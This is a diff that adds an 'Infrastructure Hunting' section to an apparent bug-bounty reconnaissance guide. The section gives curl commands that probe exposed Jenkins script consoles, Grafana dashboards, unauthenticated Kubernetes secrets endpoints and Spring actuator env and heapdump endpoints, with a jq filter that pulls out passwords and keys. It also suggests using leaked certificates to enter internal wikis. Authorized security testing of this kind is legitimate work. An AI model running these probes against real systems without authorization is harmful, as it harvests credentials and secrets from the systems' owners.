@@ -42,6 +42,49 @@ When given a root domain:
 - Elasticsearch/Kibana: port 9200, 5601 on discovered IPs. Check for unauthenticated access.
 - Jenkins/Gitlab/Jira on subdomains: default credentials, CVE checks for exposed versions.
 
+### Infrastructure Hunting (H100 Proven — $10-25K per finding)
+
+Exposed infrastructure appeared 5 times in the top 100 reports.
+
+**Exposed CI/CD:**
+```bash
+# Jenkins — often no auth required
+curl -s "https://jenkins.target.com/api/json" | jq '.jobs[].name'
+curl -s "https://jenkins.target.com/script"  # Script console = RCE
+
+# Check for open build systems
+for sub in jenkins ci build buildkite travis drone; do
+  curl -s -o /dev/null -w "$sub: %{http_code}\n" "https://$sub.target.com/"
+done
+```
+
+**Exposed Grafana:**
+```bash
+curl -s "https://grafana.target.com/api/search" | jq '.[].title'
+curl -s "https://grafana.target.com/api/dashboards/db/home" | jq '.dashboard.panels[].targets'
+# Dashboards often contain: DB queries, internal URLs, API keys, credentials
+```
+
+**Exposed Kubernetes API:**
+```bash
+curl -sk "https://target.com:6443/api/v1/namespaces"
+curl -sk "https://target.com:6443/api/v1/pods"
+curl -sk "https://target.com:6443/api/v1/secrets"
+# If 200 → full cluster access, no auth needed
+```
+
+**Exposed Spring Actuators:**
+```bash
+curl -s "https://target.com/actuator/env" | jq '.propertySources[].properties | to_entries[] | select(.key | test("password|secret|key"))'
+curl -s "https://target.com/actuator/heapdump" -o heapdump
+# Analyze heapdump for secrets
+```
+
+**Exposed admin panels from leaked certificates:**
+- Check git history for leaked VPN/SSH/TLS certificates
+- Use certificates to access internal services (Phabricator, Confluence, Jira)
+- Internal wikis often contain architecture docs, credentials, API keys
+
 ### Web3 / Blockchain Surface
 
 - Contract source verification on Etherscan/Aptos Explorer/Solana Explorer — check if unverified (binary-only).
